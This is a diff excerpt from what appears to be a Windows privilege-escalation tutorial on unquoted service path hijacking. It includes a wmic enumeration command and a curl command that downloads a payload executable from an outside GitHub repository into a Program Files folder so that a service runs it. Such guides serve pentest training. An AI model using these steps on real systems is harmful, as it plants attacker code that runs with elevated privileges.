@@ -495,7 +495,7 @@ wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows
    - If you already have the executable payload hosted somewhere, you can download it using the following `curl` command:
 
      ```bash
-     curl -o "C:\Program Files\Unquoted Path Service\Common Files\Common.exe" https://raw.githubusercontent.com/Ardemium/InsideJob/refs/heads/main/payloads/Common.exe
+     curl -o "C:\Program Files\Unquoted Path Service\Common.exe" https://raw.githubusercontent.com/Ardemium/InsideJob/refs/heads/main/payloads/Common.exe
      ```
 
      > **Note:** Modify the destination path (`"C:\Program Files\Unquoted Path Service\Common Files\Common.exe"`) to your desired location and file name, if necessary.
